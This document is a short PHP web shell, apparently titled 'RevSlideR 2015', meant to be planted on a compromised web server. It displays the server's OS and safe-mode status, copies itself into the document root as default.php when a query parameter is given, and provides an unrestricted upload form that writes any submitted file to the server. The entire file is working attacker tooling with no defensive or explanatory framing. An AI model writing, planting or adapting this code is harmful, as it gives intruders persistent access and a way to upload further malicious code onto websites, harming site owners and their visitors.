<?php
echo "<title>RevSlideR 2015</title><br><br>";
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4,1ON(BuSuX)";
}
else {$safemode = false; $hsafemode = "OFF(WoKeH)";}
$os = wordwrap(php_uname(),90,"<br>",1);
$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 7 [OS:".$os."]";
echo "<center> ".$xos." </center><br>";

if(isset($_GET['x'])){
echo "<title>PiNDaH 2015</title><br><br>";
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/default.php";
copy($source, $desti);
}

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
        else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
?>